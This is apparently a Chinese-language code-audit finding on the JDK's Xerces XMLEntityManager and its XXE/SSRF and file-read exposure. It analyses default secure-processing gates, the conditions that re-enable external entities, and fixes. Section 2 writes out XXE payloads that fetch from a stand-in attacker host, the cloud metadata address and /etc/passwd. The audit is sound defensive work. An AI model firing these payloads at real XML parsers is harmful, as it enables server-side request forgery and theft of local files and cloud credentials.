# 08. [Source/SRC-3] JAXP 外部实体 SSRF/文件读取 — XMLEntityManager

| 项目 | 内容 |
|------|------|
| 规则 | SRC-3（URL → openConnection/getInputStream，SSRF/XXE 入口） |
| 严重级别 | Medium（默认受 FSP 保护，需显式放行才触发） |
| 位置 | `java.xml/com/sun/org/apache/xerces/internal/impl/XMLEntityManager.java:650-653`（`new URL(expandedSystemId)` → `openConnection()` → 非 HttpURLConnection 直接 `getInputStream()`） |
| 模块 | java.xml（JAXP 默认解析器 Xerces 内部） |

## 1. 在 JDK 中的作用

`XMLEntityManager` 是 JDK 内置 SAX/DOM 解析器（com.sun.org.apache.xerces）的**实体管理核心**：XML 文档中的外部 DTD、外部通用实体、外部参数实体的按名解析与内容拉取都在这里。L643-653 位于实体启动路径：构造 SYSTEM 标识的绝对 URI 后 `new URL(expandedSystemId)` 打开连接——**非 http(s) 协议不强制 HttpURLConnection，直接 getInputStream**（file:/jar:/gopher: 等任意协议带内读取），http(s) 走 L655+ 的 HttpURLConnection 分支（含重定向处理）。

门控（L1230-1261，`startEntity`）：当 `unparsed ||（general && !fExternalGeneralEntities）||（parameter && !fExternalParameterEntities）|| !fSupportDTD || !fSupportExternalEntities` 时实体被标记 SKIPPED（L1244-1259），**不进入拉取**。

## 2. 使用方式（如何使用）

- `SAXParserFactory`/`DocumentBuilderFactory`/`XMLInputFactory`（StAX）解析 XML 时自动生效，无需应用感知；
- 触发外部拉取的文档形态：
  - `<!DOCTYPE foo SYSTEM "http://attacker/x.dtd">`（外部 DTD 子集）;
  - `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>` + `&xxe;` 引用（外部普通实体）;
  - `<!ENTITY % pe SYSTEM "file:///etc/passwd">`（外部参数实体，需 DTD 处理）;
  - XInclude 的 `parse="text" href="..."` 亦走本类。

## 3. 触发条件分析（什么情况下触发）

**JDK 17 默认状态（对本 jdk-src 源码逐条核实）**：

| 门控 | 实际默认值 | 结论 |
|------|-----------|------|
| `fExternalGeneralEntities` | XML11Configuration fFeatures 默认 **true**（L519） | 不拦 |
| `fExternalParameterEntities` | 默认 **true**（L520） | 不拦 |
| `LOAD_EXTERNAL_DTD` | 默认 **true**（L522） | 不拦 |
| accessExternalDTD | 默认 `EXTERNAL_ACCESS_DEFAULT=ACCESS_EXTERNAL_ALL`（"all"，L335/`JdkConstants.java:281`）——**但** | 见下行 |
| FEATURE_SECURE_PROCESSING | JDK 工厂默认 **true**（`SAXParserFactoryImpl.java:66 fSecureProcess=true`）→ `SAXParserImpl.java:160-176` 将 accessExternalDTD 置为 **""（空=全部拒绝）**，accessExternalSchema 同理 | **拦截！** |

**结论**：JDK 17 默认 `SAXParserFactory.newSAXParser()`/`DocumentBuilderFactory.newDocumentBuilder()` 解析时，外部 DTD/实体访问被 `ACCESS_EXTERNAL_DTD=""` + FSP 状态**默认拒绝**；L650 的 URL fetch 需宿主**显式**打破默认，例如：

1. `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false)`（常见 XXE 教学/老代码）;
2. `factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "all" 或 "http,file")`（JAXP 属性）;
3. 使用未走 FSP 配置的独立 parser 构造（自定义 XMLInputFactory 时 `IS_SUPPORTING_EXTERNAL_ENTITIES=true` 且 accessExternalDTD 未限制）;
4. 解析器配置了 Schema/XInclude 且 accessExternalSchema/DTD 被放行。

**满足上述放行条件 + 处理不可信 XML + 文档含外部 SYSTEM 实体引用** → XMLEntityManager L650 发起请求：http(s) 实体=SSRF（含重定向跟随），file: 实体=**任意文件读取**（非 HTTP 分支 L652-653 直接取流），up to 内网/元数据/本地敏感文件。

**fd 缓存问题**：实体流生命周期受解析作用域约束（实体结束即 close），无缓存、无泄漏；本条与 SRC-4 无交集。

## 4. 威胁场景与影响

- 应用（或其依赖）显式关闭 secure processing 或放行 accessExternalDTD（历史模板、低质量安全改造常见）→ 解析不可信 XML → SSRF/文件读取/DoS（实体扩展是另一通道，范围外）;
- 默认配置下不可触发 → 危害等级取决于宿主 XML 解析配置。

## 5. 缓解与修复建议

- 保持 FEATURE_SECURE_PROCESSING=true；不设 ACCESS_EXTERNAL_DTD;
- 需解析不可信 XML 时：`setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`（拒绝一切 DOCTYPE）;
- 确实需要外部实体的业务：用带协议白名单的实体解析封装（自实现 EntityResolver 拦截 systemId）;
- 全局防御：`jdk.xml.disableDTD`?（无此属性）——以 jaxp.properties 固定 FSP 与 access 属性。

## 6. 审计结论

分级复核：**维持 Medium**。代码面（L650-653 无协议/主机白名单、非 HTTP 直读）符合 SRC-3 判定；但 JDK 17 默认工厂的 FSP 默认开启形成有效门控，实际触发需宿主显式放行——这正是"半可信/配置决定"场景。若审计对象（宿主应用）确认存在"关闭安全处理解析不可信 XML"的代码，本条应升级为 **High**（SSRF + 任意文件读取两通道）。